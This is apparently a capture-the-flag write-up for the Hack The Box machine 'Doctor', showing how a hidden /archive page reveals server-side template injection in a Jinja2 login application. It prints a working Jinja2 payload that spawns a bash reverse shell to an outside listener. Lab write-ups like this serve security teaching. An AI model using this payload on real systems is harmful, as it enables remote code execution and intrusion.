# Alternative way to exploit Doctor

## Exploiting HTTP (Port 80) with Server-Side Template Injection

The login page _doctors.htb_ on port 80 is vulnerable to **Server-Side Template Injection (SSTI)**.
In the HTML source is a comment with a directory:
```
<!--archive still under beta testing<a class="nav-item nav-link" href="/archive">Archive</a>-->
```

The directory _/archive_ is a blank page but has contents in the HTML source code:
```
<channel>
 	<title>Archive</title>
```

When creating a new message with a basic template injection payload, there will be a new entry in the _/archive_:
```
Title: {{ 1+1 }}
Content: Test
```
```
<item><title>2</title></item>
```

This means that the template executed commands and added 1+1 to display 2 and thus proofs **Template Injection**.
The first thing is to identify, which template engine is used and the [SSTI article on Hacktricks.xyz](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#identify) explains how to test different strings.

In this case it is **Jinja2**, so we can use the [PayloadsAllTheThings repository](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2) for some useful payloads:
```
Title: {{config.__class__.__init__.__globals__['os'].popen("bash -c 'bash -i >& /dev/tcp/10.10.14.10/9001 0>&1'").read()}}
Content: Test
```

After creating the post and browsing to _/archive_, the payload will be executed and the listener on my IP and port 9001 starts a reverse shell as the user _web_.
